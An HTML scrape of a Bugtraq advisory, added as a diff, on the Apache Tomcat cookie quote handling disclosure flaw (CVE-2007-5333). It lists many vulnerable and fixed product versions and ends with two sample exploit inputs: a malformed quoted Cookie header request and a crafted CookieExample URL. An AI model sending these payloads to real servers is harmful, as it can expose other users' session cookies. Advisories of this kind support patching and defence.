@@ -1,0 +1,807 @@
+#SpeeDr00t@Black Falcon<br>#bid27706<p><b><span style="font-size: 18pt;">Apache Tomcat Cookie Quote Handling Remote Information Disclosure Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/27706/info">info</a><br><a href="http://www.securityfocus.com/bid/27706/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/27706/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/27706/solution">solution</a><br><a href="http://www.securityfocus.com/bid/27706/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				27706
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-5333<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 09 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:11PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				John Kew and Ishikawa Yoshihiro via JPCERT/CC are credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					WiKID Systems WiKID Server 3.0.4 <br/>
+					
+				
+					VMWare VirtualCenter Management Server  2<br/>
+					
+				
+					VMWare VirtualCenter 2.0.2 <br/>
+					
+				
+					VMWare VirtualCenter  2.5 Update 5<br/>
+					
+				
+					VMWare VirtualCenter  2.5 Update 2<br/>
+					
+				
+					VMWare VirtualCenter  2.5 Update 1<br/>
+					
+				
+					VMWare VirtualCenter  2.5<br/>
+					
+				
+					VMWare VirtualCenter  2.0.2 Update 5<br/>
+					
+				
+					VMWare VirtualCenter  2.0.2 Update 4<br/>
+					
+				
+					VMWare VirtualCenter  2.0.2 Update 3<br/>
+					
+				
+					VMWare VirtualCenter  2.0.2 Update 2<br/>
+					
+				
+					VMWare VirtualCenter  2.0.2 Update 1<br/>
+					
+				
+					VMWare vCenter  4.0<br/>
+					
+				
+					VMWare Server 2.0.2 <br/>
+					
+				
+					VMWare Server 2.0.1 <br/>
+					
+				
+					VMWare Server  2.0<br/>
+					
+				
+					VMWare ESX Server 3.0.3 <br/>
+					
+				
+					VMWare ESX Server 3.0.2 <br/>
+					
+				
+					VMWare ESX Server 3.0.1 <br/>
+					
+				
+					VMWare ESX Server 3.0 <br/>
+					
+				
+					VMWare ESX Server  4.0<br/>
+					
+				
+					VMWare ESX Server  3.5<br/>
+					
+				
+					SuSE SUSE Linux Enterprise Server  10 SP2<br/>
+					
+				
+					Sun Solaris  10<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Novell Groupwise  5.0.1<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Novell Groupwise  4.1.7<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Novell Groupwise  4.1.4<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Exchange  5.0.2 MR1<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Exchange  5.0.2<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Exchange  5.0.1<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Exchange  5.0 SP2<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Exchange  5.0<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Exchange  4.1.7<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Exchange  4.1.4<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Domino  5.0.2 MR1<br/>
+					
+				
+					Rim Blackberry Enterprise Server for Domino  4.1.4<br/>
+					
+				
+					Rim Blackberry Enterprise Server Express for Exchange  5.0.2 MR1<br/>
+					
+				
+					Rim Blackberry Enterprise Server Express for Exchange  5.0.2<br/>
+					
+				
+					Rim Blackberry Enterprise Server Express for Exchange  5.0.1<br/>
+					
+				
+					Rim Blackberry Enterprise Server Express for Exchange  4.1.4<br/>
+					
+				
+					Rim Blackberry Enterprise Server Express for Domino  5.0.2 MR1<br/>
+					
+				
+					Rim Blackberry Enterprise Server Express for Domino  5.0.2<br/>
+					
+				
+					Rim Blackberry Enterprise Server Express for Domino  4.1.4<br/>
+					
+				
+					Redhat Network Satellite (for RHEL 4 AS)   5.3<br/>
+					
+				
+					Redhat Network Satellite (for RHEL 4 AS)   5.2<br/>
+					
+				
+					Redhat JBoss Enterprise Web Server EL4  0<br/>
+					
+				
+					Redhat JBoss Enterprise Web Server 5.0 <br/>
+					
+				
+					Redhat Fedora  7<br/>
+					
+				
+					Redhat Enterprise Linux EUS  5.3.z server<br/>
+					
+				
+					Redhat Enterprise Linux Desktop Workstation  5 client<br/>
+					
+				
+					Redhat Enterprise Linux Desktop  5 client<br/>
+					
+				
+					Redhat Enterprise Linux  5 Server<br/>
+					
+				
+					Redhat Developer Suite AS4  3<br/>
+					
+				
+					Redhat Certificate Server  7.3<br/>
+					
+				
+					Redhat Application Server WS4  2<br/>
+					
+				
+					Redhat Application Server ES4  2<br/>
+					
+				
+					Redhat Application Server AS4  2<br/>
+					
+				
+					Pardus Linux 2008  0<br/>
+					
+				
+					Novell ZENworks Linux Management   7.3<br/>
+					
+				
+					Mandriva Linux Mandrake  2008.1 x86_64<br/>
+					
+				
+					Mandriva Linux Mandrake  2008.1<br/>
+					
+				
+					Mandriva Linux Mandrake  2008.0 x86_64<br/>
+					
+				
+					Mandriva Linux Mandrake  2008.0<br/>
+					
+				
+					IBM Tivoli Netcool/Webtop 2.1 Fix Pack 4<br/>
+					
+				
+					IBM Tivoli Netcool/Webtop 2.1 <br/>
+					
+				
+					IBM Tivoli Netcool/Webtop 1.3.1 <br/>
+					
+				
+					HP XP P9000 Performance Advisor  5.4.1<br/>
+					
+				
+					HP Network Node Manager i SPI  9.11<br/>
+					
+				
+					HP Network Node Manager i SPI  9.10<br/>
+					
+				
+					HP Network Node Manager i SPI  9.0<br/>
+					
+				
+					HP Network Node Manager i  9.11<br/>
+					
+				
+					HP Network Node Manager i  9.0<br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.15 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.14 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.13 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.12 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.11 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.10 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.9 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.8 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.7 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.6 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.5 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.4 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.3 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.2 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0.1 <br/>
+					
+				
+					Gentoo www-servers/tomcat 6.0 <br/>
+					
+				
+					Apple Mac OS X Server 10.5.5 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.11 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.10 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.9 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.8 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.7 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.6 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.5 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.4 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.3 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.2 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.1 <br/>
+					
+				
+					Apple Mac OS X Server 10.4 <br/>
+					
+				
+					Apple Mac OS X 10.4.11 <br/>
+					
+				
+					Apple Mac OS X 10.4.10 <br/>
+					
+				
+					Apple Mac OS X 10.4.9 <br/>
+					
+				
+					Apple Mac OS X 10.4.8 <br/>
+					
+				
+					Apple Mac OS X 10.4.7 <br/>
+					
+				
+					Apple Mac OS X 10.4.6 <br/>
+					
+				
+					Apple Mac OS X 10.4.5 <br/>
+					
+				
+					Apple Mac OS X 10.4.4 <br/>
+					
+				
+					Apple Mac OS X 10.4.3 <br/>
+					
+				
+					Apple Mac OS X 10.4.2 <br/>
+					
+				
+					Apple Mac OS X 10.4.1 <br/>
+					
+				
+					Apple Mac OS X 10.4 <br/>
+					
+				
+					Apache Tomcat 6.0.15 <br/>
+					
+				
+					Apache Tomcat 6.0.14 <br/>
+					
+				
+					Apache Tomcat 6.0.13 <br/>
+					
+				
+					Apache Tomcat 6.0.12 <br/>
+					
+				
+					Apache Tomcat 6.0.11 <br/>
+					
+				
+					Apache Tomcat 6.0.10 <br/>
+					
+				
+					Apache Tomcat 6.0.9 <br/>
+					
+				
+					Apache Tomcat 6.0.8 <br/>
+					
+				
+					Apache Tomcat 6.0.7 <br/>
+					
+				
+					Apache Tomcat 6.0.6 <br/>
+					
+				
+					Apache Tomcat 6.0.5 <br/>
+					
+				
+					Apache Tomcat 6.0.4 <br/>
+					
+				
+					Apache Tomcat 6.0.3 <br/>
+					
+				
+					Apache Tomcat 6.0.2 <br/>
+					
+				
+					Apache Tomcat 6.0.1 <br/>
+					
+				
+					Apache Tomcat 6.0 <br/>
+					
+				
+					Apache Tomcat 5.5.25 <br/>
+					
+				
+					Apache Tomcat 5.5.24 <br/>
+					
+				
+					Apache Tomcat 5.5.23 <br/>
+					
+				
+					Apache Tomcat 5.5.22 <br/>
+					
+				
+					Apache Tomcat 5.5.21 <br/>
+					
+				
+					Apache Tomcat 5.5.20 <br/>
+					
+				
+					Apache Tomcat 5.5.19 <br/>
+					
+				
+					Apache Tomcat 5.5.18 <br/>
+					
+				
+					Apache Tomcat 5.5.17 <br/>
+					
+				
+					Apache Tomcat 5.5.16 <br/>
+					
+				
+					Apache Tomcat 5.5.15 <br/>
+					
+				
+					Apache Tomcat 5.5.14 <br/>
+					
+				
+					Apache Tomcat 5.5.13 <br/>
+					
+				
+					Apache Tomcat 5.5.12 <br/>
+					
+				
+					Apache Tomcat 5.5.11 <br/>
+					
+				
+					Apache Tomcat 5.5.10 <br/>
+					
+				
+					Apache Tomcat 5.5.9 <br/>
+					
+				
+					Apache Tomcat 5.5.8 <br/>
+					
+				
+					Apache Tomcat 5.5.7 <br/>
+					
+				
+					Apache Tomcat 5.5.6 <br/>
+					
+				
+					Apache Tomcat 5.5.5 <br/>
+					
+				
+					Apache Tomcat 5.5.4 <br/>
+					
+				
+					Apache Tomcat 5.5.3 <br/>
+					
+				
+					Apache Tomcat 5.5.2 <br/>
+					
+				
+					Apache Tomcat 5.5.1 <br/>
+					
+				
+					Apache Tomcat 5.5 <br/>
+					
+				
+					Apache Tomcat 5.4 <br/>
+					
+				
+					Apache Tomcat 5.3 <br/>
+					
+				
+					Apache Tomcat 5.2 <br/>
+					
+				
+					Apache Tomcat 5.1 <br/>
+					
+				
+					Apache Tomcat 5.0.31 <br/>
+					
+				
+					Apache Tomcat 5.0.30 <br/>
+					
+				
+					Apache Tomcat 5.0.28 <br/>
+					
+				
+					Apache Tomcat 5.0.19 <br/>
+					
+				
+					Apache Tomcat 5.0.16 <br/>
+					
+				
+					Apache Tomcat 5.0.15 <br/>
+					
+				
+					Apache Tomcat 5.0.14 <br/>
+					
+				
+					Apache Tomcat 5.0.13 <br/>
+					
+				
+					Apache Tomcat 5.0.12 <br/>
+					
+				
+					Apache Tomcat 5.0.11 <br/>
+					
+				
+					Apache Tomcat 5.0.10 <br/>
+					
+				
+					Apache Tomcat 5.0.9 <br/>
+					
+				
+					Apache Tomcat 5.0.8 <br/>
+					
+				
+					Apache Tomcat 5.0.7 <br/>
+					
+				
+					Apache Tomcat 5.0.6 <br/>
+					
+				
+					Apache Tomcat 5.0.5 <br/>
+					
+				
+					Apache Tomcat 5.0.4 <br/>
+					
+				
+					Apache Tomcat 5.0.3 <br/>
+					
+				
+					Apache Tomcat 5.0.2 <br/>
+					
+				
+					Apache Tomcat 5.0.1 <br/>
+					
+				
+					Apache Tomcat 5.0 <br/>
+					
+				
+					Apache Tomcat 4.1.36 <br/>
+					
+				
+					Apache Tomcat 4.1.34 <br/>
+					
+				
+					Apache Tomcat 4.1.32 <br/>
+					
+				
+					Apache Tomcat 4.1.31 <br/>
+					
+				
+					Apache Tomcat 4.1.24 <br/>
+					
+				
+					Apache Tomcat 4.1.12 <br/>
+					
+				
+					Apache Tomcat 4.1.10 <br/>
+					
+				
+					Apache Tomcat 4.1.9 beta<br/>
+					
+				
+					Apache Tomcat 4.1.3 beta<br/>
+					
+				
+					Apache Tomcat 4.1 <br/>
+<span class="related">
+						
+							-
+						
+						BSDI BSD/OS 4.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux 2.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.3 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Digital UNIX 4.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						FreeBSD FreeBSD 5.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						FreeBSD FreeBSD 4.5 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Mandriva Linux Mandrake 7.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Mandriva Linux Mandrake 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						NetBSD NetBSD 1.4.2  x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						NetBSD NetBSD 1.4.1  x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.2  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.1  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SGI IRIX 6.5 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SGI IRIX 6.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SGI IRIX 3.3 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+					
+				
+					Apache Tomcat  5.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					WiKID Systems WiKID Server 3.0.5 <br/>
+					
+				
+					VMWare VirtualCenter  2.5 Update 6<br/>
+					
+				
+					VMWare vCenter  4.0 Update 1<br/>
+					
+				
+					IBM Tivoli Netcool/Webtop 2.1 Fix Pack 5<br/>
+					
+				
+					IBM Tivoli Netcool/Webtop 1.3.13 <br/>
+					
+				
+					HP XP P9000 Performance Advisor  5.5.1<br/>
+					
+				
+					Apache Tomcat 6.0.16 <br/>
+					
+				
+					Apache Tomcat 5.5.26 <br/>
+					
+				
+					Apache Tomcat 4.1.37 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples are available:<br/><br/>+++<br/>GET /myapp/MyCookies HTTP/1.1<br/>Host: localhost<br/>Cookie: name="val " ue"<br/>Cookie: name1=moi<br/>+++<br/><br/>http://www.example.com/examples/servlets/servlet/CookieExample?cookiename=test&amp;amp;cookievalue=test%5c%5c%22%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%<br/>3B+Path%3D%2Fservlets-examples%2Fservlet+%3B
+	
+		<ul>
+</ul>
+</div>
